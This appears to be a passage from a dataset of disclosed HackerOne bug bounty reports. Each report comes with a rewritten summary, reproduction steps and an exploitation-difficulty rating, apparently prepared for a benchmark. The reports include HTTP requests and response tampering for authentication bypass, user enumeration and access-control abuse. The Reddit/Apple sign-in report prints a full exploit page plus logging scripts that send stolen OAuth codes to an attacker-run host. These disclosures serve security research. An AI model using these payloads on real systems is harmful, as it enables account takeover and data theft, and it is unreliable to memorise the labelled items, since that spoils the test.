Mitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.



================================================================================
Vulnerability Description:
The admin panel and all its functions can be accessed without authentication due to a flaw in the redirect mechanism. By intercepting and modifying the HTTP response, an attacker can bypass authentication and perform administrative actions such as uploading, deleting, or modifying files.

Steps to Reproduce:
1. Navigate to the admin panel URL and intercept the response using a tool like Burp Suite.
2. Modify the response status code from 302 Found to 200 OK to bypass the redirect and access the admin panel.
Exploitation Difficulty:
The vulnerability involves intercepting and modifying a single HTTP response to bypass authentication. While the attack requires some knowledge of HTTP protocols and tools like Burp Suite, the steps are straightforward and do not involve complex interactions or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1439026: Discoverability by phone number/email restriction bypass
================================================================================
RAW DESCRIPTION:

Summary: By using this vulnerability an attacker can find a twitter account by it's phone number/email even if the user has prohibited this in the privacy options.
Description: The vulnerability allows any party without any authentication to obtain a twitter ID(which is almost equal to getting the username of an account) of any user by submitting a phone number/email even though the user has prohibitted this action in the privacy settings. The bug exists due to the proccess of authorization used in the Android Client of Twitter, specifically in the procces of checking the duplication of a Twitter account.
Steps To Reproduce:
In this example I will show you how to get a Twitter ID of a user with an email "████████" (this an account created by me to demonstrate this bug)
0.Disable discoverability in your Twitter account settings
At first we create a LoginFlow by sending a POST request to https://api.twitter.com/1.1/onboarding/task.json?flow_name=login
Headers (stay the same for all the requests):
User-Agent: ████ (████)
Accept-Encoding: gzip, deflate
Authorization: Bearer ███████
X-Guest-Token: █████ #This value changes dynamically and must be generated every once in a while
Accept: application/json
X-Twitter-Client: TwitterAndroid
System-User-Agent: ██████
Content-Encoding: application/json
Content-Type: application/json
Accept-Language: en-US
Body:
{"flow_token":null,"input_flow_data":{"country_code":null,"flow_context":{"start_location":{"location":"deeplink"}},"requested_variant":null,"target_user_id":0}}
Response:
{"flow_token":"██████","status":"success","subtasks":[{"subtask_id":"LoginEnterUserIdentifier","enter_text":{"primary_text":{"text":"To get started, first enter your phone, email, or @username","entities":[]},"hint_text":"Phone, email, or username","multiline":false,"auto_capitalization_type":"none","auto_correction_enabled":false,"os_content_type":"username","keyboard_type":"text","next_link":{"link_type":"task","link_id":"next_link","label":"Next"},"skip_link":{"link_type":"subtask","link_id":"forget_password","label":"Forgot password?","subtask_id":"RedirectToPasswordReset"}},"subtask_back_navigation":"cancel_flow"},{"subtask_id":"RedirectToPasswordReset","open_link":{"link":{"link_type":"deep_link_and_abort","link_id":"password_reset_deep_link","url":"twitter://onboarding/task?flow_name=password_reset&input_flow_data=%7B%22requested_variant%22%3A%███%22%7D"}}}]}
As you can see we have aquired the flow token value which is used in the next request.
Send a POST request to https://api.twitter.com/1.1/onboarding/task.json with the same headers and a flow token aquired in the previous response
Body:
{"flow_token":"██████","subtask_inputs":[{"enter_text": {"suggestion_id":null, "text": "█████████", "link": "next_link"},
"subtask_id": "LoginEnterUserIdentifier"}]}
Response:
{"flow_token":"████","status":"success","subtasks":[{"subtask_id":"AccountDuplicationCheck","check_logged_in_account":{"true_link":{"link_type":"task","link_id":"AccountDuplicationCheck_true"},"false_link":{"link_type":"task","link_id":"AccountDuplicationCheck_false"},"user_id":"███"}}]}
As you can see we have aquired the user ID which can then be used to get the full info about the twitter account (there are many ways to do this), even though I have disabled discoverability in my user settings!
Impact:
This is a serious threat, as people can not only find users who have restricted the ability to be found by email/phone number, but any attacker with a basic knowledge of scripting/coding can enumerate a big chunk of the Twitter user base unavaliable to enumeration prior (create a database with phone/email to username connections). Such bases can be sold to malicious parties for advertising purposes, or for the purposes of tageting celebrities in different malicious activities
Also a cool feature that I discoverd is that you can even find the id's of suspended Twitter accounts using this method.
Supporting Material/References:
██████ A simple console Python script that demonstrates this vulnerabilty (requires the requests library to run)
Impact
This is a serious threat, as people can not only find users who have disbaled discoverability by email/phone number, but any attacker with a basic knowledge of scripting/coding can enumerate a big chunk of the Twitter user base unavaliable to enumeration prior (create a database with phone/email to username connections). Such bases can be sold to malicious parties for advertising purposes, or for the purposes of tageting celebrities in different malicious activities.
Short: this can lead to a loss of privacy for many users.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to discover a Twitter account by its phone number or email even if the user has disabled this feature in privacy settings. The attacker can obtain the Twitter ID (equivalent to the username) by exploiting the authorization process in the Twitter Android client during account duplication checks.

Steps to Reproduce:
0. Disable discoverability in your Twitter account settings
1. Create a LoginFlow by sending a POST request to https://api.twitter.com/1.1/onboarding/task.json?flow_name=login with specific headers and body
2. Send a POST request to https://api.twitter.com/1.1/onboarding/task.json with the flow token acquired in the previous response
3. Acquire the user ID from the response, which can then be used to get full info about the Twitter account
Exploitation Difficulty:
The vulnerability involves understanding the Twitter Android client's authorization process, specifically the account duplication check, and manipulating the flow to bypass privacy settings. It requires knowledge of API interactions and the ability to craft specific requests, but the steps are relatively straightforward once the API endpoints and required headers are known.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1472721: IDOR at https://demo.sftool.gov/TwsHome/ScorecardManage/ via scorecard name
================================================================================
RAW DESCRIPTION:

Hi Team,
I have found a broken access control vulnerability on https://demo.sftool.gov/ under your /tws directory.
I made two accounts.
One account i browsed to /tws and created a new scorecard. Here i can submit all information I need. The scorecard name is in the end of the URL https://demo.sftool.gov/TwsHome/ScorecardManage/testdsfdfsf
I logged out this account
I logged into attacker account. I browse to https://demo.sftool.gov/TwsHome/ScorecardManage/testdsfdfsf (the last part is the name of the other accounts score card). I can now view the scorecard and even edit the score card from the attackers account. I can add accounts to read only and edit permissions on the score card and change information as-well as download the score card.
Log back into the victim account and the scorecard information has been changed, downloaded and attacker has assigned permissions.
We can brute force scorecard names but i am not doing this as the above on my accounts already shows the issue.
Many thanks
Holla
Impact
An attacker can read, edit and download and assign permissions to another users scorecard.



================================================================================
Vulnerability Description:
This is an Insecure Direct Object Reference (IDOR) vulnerability that allows an attacker to access, modify, download, and manage permissions of another user's scorecard by simply knowing or guessing the scorecard name in the URL. The application fails to enforce proper access controls, enabling unauthorized actions on sensitive data.

Steps to Reproduce:
1. Create two accounts (victim and attacker) on https://demo.sftool.gov/.
2. Log in as the victim account, navigate to /tws, and create a new scorecard. Note the scorecard name in the URL (e.g., https://demo.sftool.gov/TwsHome/ScorecardManage/testdsfdfsf).
3. Log out of the victim account and log in as the attacker account.
4. Access the victim's scorecard by browsing to the URL noted in step 2 (e.g., https://demo.sftool.gov/TwsHome/ScorecardManage/testdsfdfsf).
5. Observe that the attacker can view, edit, download, and assign permissions to the victim's scorecard.
6. Log back into the victim account and verify that the scorecard has been modified by the attacker.
Exploitation Difficulty:
The vulnerability is straightforward to discover as it involves basic enumeration of URLs and does not require complex interactions or state manipulation. The attack relies on predictable object references (scorecard names) and lacks any access control checks, making it easy to exploit once the pattern is identified.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1486310: admin.8x8.vc: Member users with no permission can integrate email to connect calendar via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?..
================================================================================
RAW DESCRIPTION:

Dear Team,
Greetings!!!
I have observed an Improper access control Issue. Member users do not have permission to rooms area of the admin section. But member users can exploit this via GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
<image_0>
<image_1>
Step3: From member user's JWT send a request to below endpoint
Use ██████
Code 513 Bytes
1GET /meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd HTTP/2
2Host: admin.8x8.vc
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
4Accept: */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Referer: https://admin.8x8.vc/
8Content-Type: application/json
9Sec-Fetch-Dest: empty
10Sec-Fetch-Mode: cors
11Sec-Fetch-Site: same-origin
12Te: trailers
13Connection: close
14Authorization: <Member user's JWT>
Step4: You will receive the Link as below from the above endpoint:
Code 250 Bytes
1{"url":"https://app.cronofy.com/oauth/authorize?response_type=code&client_id=M0wBDPDXk6EQLaGCqp-pTN_VGt7_AtM9&redirect_uri=https://api-vo.jitsi.net/rosy/sso/cronofy/callback&scope=read_only&delegated_scope=read_only&state=███████&avoid_linking=true"}
<image_2>
Step6: Member user successfully added his/her email into admin's room area
Use ███
Best regards,
Emperor
Impact
Member users with no permission can integrate email to connect calendar



================================================================================
Vulnerability Description:
Member users, who should not have access to the rooms section of the admin panel, can exploit a misconfigured endpoint to integrate their email calendars into the admin's room area. This improper access control allows unauthorized actions by bypassing permission checks.

Steps to Reproduce:
1. As a member user, send a GET request to the endpoint `/meet-external/spot-roomkeeper/v1/calendar/auth/init?successRedirectUrl=https%3A%2F%2Fadmin.8x8.vc%2F%23%2Frooms%2Fadd` with your JWT token in the Authorization header.
2. Receive a response containing a URL to integrate an email calendar (e.g., Cronofy OAuth link). Follow this URL to complete the integration.
3. Observe that the member user's email is successfully integrated into the admin's room area despite lacking proper permissions.
Exploitation Difficulty:
The vulnerability involves a straightforward exploitation of an endpoint that lacks proper permission validation. While it requires understanding the endpoint's behavior and crafting a request, the steps are linear and do not involve complex interactions or state manipulations.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1493007: Broken access control, can lead to legitimate user data loss
================================================================================
RAW DESCRIPTION:

Hi team,
During testing the security of ██████████ I found another possible attack vector:
(There are two reports preceding this one - https://hackerone.com/reports/1489470 and https://hackerone.com/reports/1489744)
I will try to explain:
When an user need access to that information system he fills a request form at:
https://█████████/████████
or
https://█████████/██████
After submitting the form the server response contains a █████████ which identifies this user request.
Then the request is reviewed by an administrator, and he decides if user access will be granted or rejected.
The vulnerability I found is that unauthorized person can access the end point responsible for deleting user requests - █████████ and by providing just the ███ parameter he can delete any request.
References
Impact
An attacker can delete legitimate user requests, disturbing the normal operation of the system and causing data loss.
The user request ids are sequential numbers - my requests were given ids - ████████, so the attacker can delete all requests in the system by accessing the ████ end point with each ██████ from ██████████.
System Host(s)
███████
Affected Product(s) and Version(s)
██████████
CVE Numbers
Steps to Reproduce
Activate Burp proxy, go to https://███/██████████, fill and submit the form (screenshot1)
Inspect server response in Burp and take a note of the returned █████ (screenshot2) which is number, referencing this user access request
(optional) we can confirm our request is in the system by performing the attack described in the other report I made (https://hackerone.com/reports/1489470) - resulting in our request being exfiltrated from the database:
execute following command, and replace the █████ parameter with the one you noted on step 2 (screenshot)
curl https://██████/██████████ -X POST -data="url=%2F████&██████████=████████" -k
Deleting the request - CAUTION - execute this step only by referencing ██████████ for requests, you made otherwise you will delete legitimate user request!(sceenshot4)
the command abusing the delete request endpoint is:
curl https://██████/███████████████ -X POST -data="url=%2F███████&███████=██████" -k
(optional) to confirm request is deleted you can execute again Step 3, which now responds with empty body - the request is no longer present in the database.
Suggested Mitigation/Remediation Actions
The ██████████ endpoint should perform check if the user is logged in and authorized to use it.



================================================================================
Vulnerability Description:
The vulnerability allows an unauthorized person to delete any user request by accessing the delete endpoint with just the request ID parameter. This can lead to legitimate user data loss and disruption of normal system operations.

Steps to Reproduce:
1. Activate Burp proxy, go to the request form URL, fill and submit the form.
2. Inspect server response in Burp and note the returned request ID.
3. Use the noted request ID to construct a curl command to delete the request.
4. Execute the curl command to delete the request, confirming deletion by checking the system.
Exploitation Difficulty:
The attack involves understanding the request flow and identifying the delete endpoint, but does not require complex interactions or novel logic. The main challenge is recognizing the sequential nature of request IDs and the lack of authorization checks.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1567186: One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com
================================================================================
RAW DESCRIPTION:

Hi,
Description
I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.
The way it works is this:
Attacker prepares a state-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.
Attacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with www.redditmedia.com, which is an intentional sandbox but with a fun quirk, it uses window.name of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.
The javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the state-value that the attacker set. Also, the response_type is modified from code to code+id_token and the response_mode to fragment. This is the second important part why we can steal the code, since Reddit uses response_mode=web_message live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. Reddit is not expecting to get any sensitive tokens in the URL fragment. Also, the redirect_uri set in the OAuth-application in Apple for Reddit is allowing https://reddit.com only as the return page. This is something you need to remove, or point elsewhere. When you're using response_mode=web_message, the redirect_uri doesn't really matter what it is set to, since the whole origin of https://reddit.com will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.
Victim clicks the link from the attacker page, will go through "sign-in with Apple" for Reddit, but with the attacker's state-parameter. When the login process is completed, the URL of the main page becomes https://reddit.com/#state=xxx&code=xxx&access_token=xx.
The XSS on www.redditmedia.com in the first window, which has the same domain as the iframe, will be allowed to ask about the window.name of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.
Here's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:
And here's a link for testing:
Code 48 Bytes
1https://fransrosen.com/reddit-hijack-424342.html
Technical details
Here's the HTML of the malicious page:
Code 3.07 KiB
1<html>
2<style>pre { word-break: break-word; white-space: pre-wrap; }</style>
3<body>
4<div id="start">
5Attacker, enter your Apple ID-OAuth URL when trying to <a href="https://reddit.com" target="_blank">sign in to Reddit here</a>:<br />
6<input id="state">
7<button onclick="launch(extractstate(document.getElementById('state').value), true)">Generate a victim URL with attacker's state</button>
8</div>
9
10
11<div id="fr"></div>
12
13<script>
14var inj, monitor;
15function extractstate(st) {
16    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;
17}
18function startmonitor(st) {
19    history.pushState('/','/',location.pathname + '?monitor&state=' + st)
20    monitor = setInterval(function() {
21        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {
22            if (e.length) {
23                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';
24                var p = document.createElement('pre');
25                p.innerText = 'opener.postMessage(\'' + unescape(e.trim()) + '\',"*");';
26                document.getElementById('fr').appendChild(p)
27                clearInterval(monitor);
28            }
29        });
30    }, 2000);
31}
32function launch(st, showonly) {
33    if (showonly) {
34        history.pushState('/','/',location.pathname + '?state=' + st)
35        document.getElementById('fr').innerText = 'Send this link to victim: ';
36        var p = document.createElement('pre');
37        p.innerText = location.href;
38        document.getElementById('fr').appendChild(p);
39        startmonitor(st);
40    } else {
41        document.getElementById('fr').innerHTML = '<iframe src="https://www.redditmedia.com/gtm/jail?id=GTM-N3HH8D6&state=' + encodeURIComponent(st) + '" frameborder=0 style="width: 500px; height: 300px"></iframe>';
42    }
43    document.getElementById('start').innerHTML = '';
44}
45if (location.search && location.search.split('state=')[1].split('&')[0]) {
46    launch(location.search.split('state=')[1].split('&')[0], location.search.indexOf('monitor') !== -1);
47}
48window.onmessage = function(e) {
49    if (e.data === 'stopinject') {
50        console.log('frame injected');
51        clearInterval(inj)
52    }
53    if (e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) {
54        payload = JSON.parse(e.data);
55        data = payload.hash.replace('state=state=', 'state=');
56        var state = data.split('state=')[1].split('&')[0];
57        var code = data.split('code=')[1].split('&')[0];
58        var id_token = data.split('id_token=')[1].split('&')[0];
59        var payload = JSON.stringify({method:'oauthDone',data:{authorization:{code:code,id_token:id_token,state:state}}});
60
61        document.getElementById('fr').innerHTML = 'Attacker now have the code from Apple:<br />';
62        var p = document.createElement('pre');
63        p.innerText = payload;
64        document.getElementById('fr').appendChild(p);
65
66        var s = document.createElement('img');
67        s.src = 'https://MY-LOGGER-DOMAIN/reddit/log.php?' + payload;
68        document.body.appendChild(s);   
69    }
70}
71
72</script>
73
74
75</body>
76</html>
What this page will do is:
Ask the attacker to prepare the state-param from its own browser. This is to taint the victim's code with the state so that the attacker can then sign in. This will also start to monitor the log asking for any code from the state provided.
<image_0>
<image_1>
Load the https://www.redditmedia.com with my own custom GTM into an iframe. It is not restricted to be framed in any way, anyone can load it.
The GTM-script will load, it looks like this:
Code 1.06 KiB
1<script>var b, x;
2var state = parent.location.href.substr(location.href.indexOf('state='));
3var d = document.createElement('div');
4if (!window.inited) {
5  window.inited = true;
6d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
7parent.document.children[parent.document.children.length - 1].appendChild(d);
8if(top!==parent.window) top.postMessage('stopinject', '*');
9parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
10x = setInterval(function() {
11if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
12  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
13  clearInterval(x);
14};
15
16}, 500);
17}
18</script>
This javascript will render the "Click here"-link:
<image_2>
It will ask the parent window to stop injecting by postMessage, and it will run an interval looking for the frames[1].window.name, which is the regular www.redditmedia.com iframe of the window that was opened, as soon as it contains code, the value will be sent to the attacker main window through this frame.
5. The attacker's main window will listen for a postMessage containing code and will show the state+code in the window. The page will then load an external logging-URL with the payload.
<image_3>
The attacker now gets the token from the victim in his browser thanks to the monitoring of the log on my server:
<image_4>
Logging endpoints
I've added some endpoints in the HTML to log and parse the log to extract the code-parameter. You need to use your own endpoints if you don't want to try mine above from my link.
https://USE-YOUR-OWN-LOGGER/reddit/log.php looks like this:
Code 120 Bytes
1<?php
2
3if (isset($_SERVER['QUERY_STRING'])) {
4	file_put_contents('r.log', $_SERVER['QUERY_STRING']."\n", FILE_APPEND);
5}
And https://USE-YOUR-OWN-LOGGER/reddit/parse.php looks like this:
Code 313 Bytes
1<?php
2header("Access-Control-Allow-Origin: *");
3header("Content-type: text/plain");
4
5$key = @$_GET['q'];
6if (!$key || !preg_match('#^[a-f0-9]{48}$#', $key)) { die; }
7$data = explode("\n", file_get_contents('r.log'));
8foreach($data as $line) {
9	if (strpos($line, $key) !== false) {
10		echo $line . "\n";
11		die;
12	}
13}
Mitigation
Remove fragment part when location is sent to www.redditmedia.com or any other party.
Restrict your redirect_uri of Apple-ID to something that does not load a domain that could run arbitrary javascript.
Impact
Attacker can sign in as the victim. There's minimal interaction needed, only one click.
This took quite some time to get built :) I hope you'll like it!
Regards,
Frans



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to hijack a victim's Reddit account when using Apple sign-in by manipulating the OAuth flow to leak tokens via URL fragment and capturing them through an XSS in a www.redditmedia.com iframe.

Steps to Reproduce:
1. Attacker prepares a state-parameter from their own Apple sign-in flow with Reddit.
2. Attacker creates a malicious page with their state parameter and loads an iframe from www.redditmedia.com.
3. Victim clicks a link on the attacker's page, initiating Apple sign-in with the attacker's state parameter.
4. After sign-in, tokens appear in the URL fragment of reddit.com, which the attacker's iframe captures via XSS.
5. Attacker uses the stolen tokens to hijack the victim's Reddit account.
Exploitation Difficulty:
The attack involves multiple components (OAuth flow manipulation, XSS, iframe communication) and requires understanding subtle interactions between them, such as response_type switching and fragment token leakage. The attacker must also maintain context across these components while crafting the exploit.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1596663: Admin can create a hidden admin account  which even the owner can not detect and remove and do administrative actions on the application.
================================================================================
RAW DESCRIPTION:

ads.reddit.com is an ads creating and managing application for reddit. The application has the feature to invite other members to the organization and give different roles at ad management.
Testing around the role management functionalities, I have noticed that a user with the same email can get invited to the same organization multiple times if the user is assigned with different roles.
So, taking advantage of this behavior I found the admin as an attacker can create an undetectable/hidden admin account and do administrative actions on the organization like remove other users and invite other users. Since this malicious account information can not be seen in the members section, even the owner of the organization can not detect and remove this malicious user from the organization.
Steps to reproduce:
1) Login as admin from https://ads.reddit.com/
Code 249 Bytes
1I know creating an owner account and then creating an admin account with in a limited time is  little-bit painful.
2You can use the following credentials to login as admin
3
4        email :██████████
5        name: ███████
6        password : ██████████
2) Go to https://ads.reddit.com/account/███/permissions and invite a user (malicious hidden user) by giving the role as admin
3) login to that account (malicious hidden user) from a different browser and accept the invite.
4) Same as the second step, go to the admin account and invite the same malicious user by giving the role as Analyst.
5) Now go to the malicious user account and then go to https://ads.reddit.com/accounts.
6) You will see the new invitation arrived with the Analyst role. Accept the invitation.
7) From this account (malicious) go to https://ads.reddit.com/account/████████/billing while intercepting the requests using burpsuite.
8) Look at the burp history and find out the Authorization token used by the account and copy it. (see copy-the-auth-token.png)
9) Now go to the normal admin account and change the permission of this malicious account to None (It removes malicious account from the organization) and refresh the page to confirm that the malicious user is removed.
10) Using burpsuite repeater, change the email and send the following request by replacing the token which you copied from the 8'th step.
Code 660 Bytes
1POST /api/v2.0/accounts/█████████/invitations HTTP/2
2Host: ads-api.reddit.com
3Content-Length: 87
4Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="102"
5Accept: application/json
6Content-Type: application/json
7Authorization: ██████
8Sec-Ch-Ua-Mobile: ?0
9User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36
10Sec-Ch-Ua-Platform: "Linux"
11Origin: https://ads.reddit.com
12Sec-Fetch-Site: same-site
13Sec-Fetch-Mode: cors
14Sec-Fetch-Dest: empty
15Referer: https://ads.reddit.com/
16Accept-Encoding: gzip, deflate
17Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
18
19{"data":{"recipient_email":"█████████","type":"ADMIN"}}
20
11) Now you are able to invite other users to the organization even though you are not a member of that organization.
Impact
Let me explain the impact with different scenarios as an example.
1)
The owner invites an admin to the organization and the admin who knows about this issue creates an account in this way.
Latter, the owner decide to change the role of this admin to analyst or remove this admin from the organization due to some reasons
Now the admin as the malicious user, can do sensitive actions in the organization like inviting or removing other users.
When the owner goes to the members section, he will not find the malicious account there and even he can not remove that malicious account from the organization.
2)
It also happens when the owner or admin invites other users accidentally in this way.
It is not complicated, the vulnerability arises when a user accepts multiple invitations assigned with different roles from a single organization.



================================================================================
Vulnerability Description:
An admin can create a hidden admin account by exploiting the ability to invite the same user with different roles. This hidden account remains undetectable and can perform administrative actions even after being 'removed' from the organization.

Steps to Reproduce:
1. Login as admin from https://ads.reddit.com/
2. Go to permissions page and invite a user with admin role
3. Login to the invited account and accept the invite
4. From the admin account, invite the same user again but with Analyst role
5. From the malicious user account, accept the new invitation
6. Use Burp Suite to capture the Authorization token from the malicious account
7. From the admin account, change the malicious user's role to None to remove them
8. Use the captured token to send a request to invite another user as an admin
9. Verify the malicious account can perform admin actions despite being 'removed'
Exploitation Difficulty:
The vulnerability involves multiple steps including role manipulation, session token capture, and exploiting invitation logic. The interaction between these components is subtle and requires understanding of the application's state management.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1624374: Broken access discloses users and PII at https://███████ [HtUS]
================================================================================
RAW DESCRIPTION:

Good morning,
I was able to register at https://████/ and get the list of users.
1- Go to https://██████████/OA_HTML/ibeCAcpSSOReg.jsp and register.
2- Go to https://███/OA_HTML/AppsLocalLogin.jsp with the created user and login.
3- On the homepage, click on vacations rules, create, and search users.
4- User are disclosed.
██████
Regards,
G4MB4
Impact
An attacker is able to access users information.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to register an account and subsequently access a list of users and their personally identifiable information (PII) through the 'vacations rules' feature. This constitutes a broken access control issue leading to unauthorized information disclosure.

Steps to Reproduce:
1. Go to https://██████████/OA_HTML/ibeCAcpSSOReg.jsp and register a new user.
2. Log in with the created user at https://███/OA_HTML/AppsLocalLogin.jsp.
3. Navigate to the homepage, click on 'vacations rules', then 'create', and perform a user search.
4. Observe the list of disclosed users and their PII.
Exploitation Difficulty:
The attack involves straightforward steps: registration, login, and navigating to a specific feature. There are no complex interactions, state manipulations, or novel logic required. The vulnerability is discovered through basic exploration of the application's features.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1690548: Authentication bypass leads to Information Disclosure at  U.S Air Force "https://███"
================================================================================
RAW DESCRIPTION:

Hi Hackerone Triage team,
I'm new in this program, what i understood that every Web Owned/Operated by DoD is in scope , so i did some google searches , exactly in wikipedia and i've find this PNG that confirms that U.S Air Force is in scope : https://en.wikipedia.org/wiki/United_States_Department_of_Defense#/media/File:DoD_Organization_December_2013.jpg
Authentication vulnerabilities are some of the simplest issues to understand. However, they can be among the most critical due to the obvious relationship between authentication and security. As well as potentially allowing attackers direct access to sensitive data and functionality, they also expose additional attack surface for further exploits.
So While testing AIR Force domain "*.af.mil" , i've find this subdomain https://███/ that have a Login page , it's look like an Admin things , so i did some pentesting , and it's time to Authentication Bypass , especially because it uses APIs to deal with Database.
System Host(s)
█████
Affected Product(s) and Version(s)
U.S Air Force: af.mil
Steps to Reproduce
Steps for POC / Exploit :
1.go "https://████/harbor/sign-in" , then username:password as : admin:admin
2.Please be aware that we are going to intercept every single request in our Process of exploitation ,
3.Before forwarding the request , using burp actions , use ;
Code 39 Bytes
1Do intercept : response to this request
4.Change the Value of response :
From
Code 321 Bytes
1HTTP/1.1 401 Unauthorized
2vary: Cookie
3x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==
4x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631
5date: Sat, 03 Sep 2022 18:42:09 GMT
6content-length: 0
7x-envoy-upstream-service-time: 1510
8server: envoy
9connection: close
TO THIS and forwarded it
Code 312 Bytes
1HTTP/1.1 200 OK
2vary: Cookie
3x-harbor-csrf-token: iigZs1FeT+ma5p15YDOTceiExGhLs734jPuOUXGYygmDuPNpxeuWKZArsB5T2GLeHoCfljAuXggKWOJ0LINdiA==
4x-request-id: b418b4ea-cf8d-4b07-9774-58735c4ab631
5date: Sat, 03 Sep 2022 18:42:09 GMT
6content-length: 0
7x-envoy-upstream-service-time: 1510
8server: envoy
9connection: close
10
5.Ignore the second request about : GET /api/v2.0/systeminfo HTTP/1.1 not neccaserry
6.Intercept again and use methods in 3,4:
Code 650 Bytes
1GET /api/v2.0/users/current HTTP/1.1
2Host: █████
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
4Accept: application/json
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/json
8Cache-Control: no-cache
9Pragma: no-cache
10Connection: close
11Referer: https://█████/harbor/sign-in
12Cookie: sid=a66e49e995c2fe659086de2237f422c2; _gorilla_csrf=MTY2MjIyOTI3N3xJa05hUkhFeWNGTXhNbU5CUzNwVE1XNU5LM1o0Y2k5WlJWY3ZOVGR1WlZCM2FIRk9jMHBXTUdKc05FVTlJZ289fB0DLyMK59qRUoo_SpL9Sv0QZkyDGLDVGMNa9_UYMSWz
13Sec-Fetch-Dest: empty
14Sec-Fetch-Mode: cors
15Sec-Fetch-Site: same-origin
16X-FORWARDED-FOR: 127.0.0.1
*Change it from
Code 444 Bytes
1HTTP/1.1 401 Unauthorized
2content-type: application/json; charset=utf-8
3vary: Cookie, Accept-Encoding
4x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==
5x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7
6date: Sat, 03 Sep 2022 18:45:12 GMT
7x-envoy-upstream-service-time: 3
8server: envoy
9connection: close
10Content-Length: 61
11
12{"errors":[{"code":"UNAUTHORIZED","message":"UnAuthorize"}]}
To
Code 398 Bytes
1HTTP/1.1 200 OK
2content-type: application/json; charset=utf-8
3vary: Cookie, Accept-Encoding
4x-harbor-csrf-token: 1Brx7L2ZghZjt/RmUbMX2xFyuOM0OCVlj19hqoQrXzbdihs2KSxb1ml62QFiWOZ053bjHU+lxpUJ/A2P2TDItw==
5x-request-id: 8f4fd500-739a-437d-a42b-621206ff51a7
6date: Sat, 03 Sep 2022 18:45:12 GMT
7x-envoy-upstream-service-time: 3
8server: envoy
9connection: close
10Content-Length: 61
11
12{"message":"Authorized"}
7.Keep intercepting any request and check if response header and body are :
Code 88 Bytes
1HTTP/1.1 401 Unauthorized
2
3{"errors":[{"code":"UNAUTHORIZED","message":"UnAuthorize"}]}
4
to
Code 38 Bytes
1HTTP/1.1 200 OK
2{"message":Authorized}
Then BOOM , i was able to enter your data as shown in my ScreenShots , and for sure that when i tap in Profile , i can see UserProfile
████████
██████
██████████
Please be aware that :
I wanted to stop my Hacking Process here , for not damaging or harm or delete any data for the server , so if you want to go further with exploitation to increase the impact or clear you mind that is a valid Bug, please let me know as soon as possible
Impact
Sensitive Information Disclosure
Results that i've find so far:
Code 25 Bytes
1█████████████████████████
Burp ScreenShot :
██████████



================================================================================
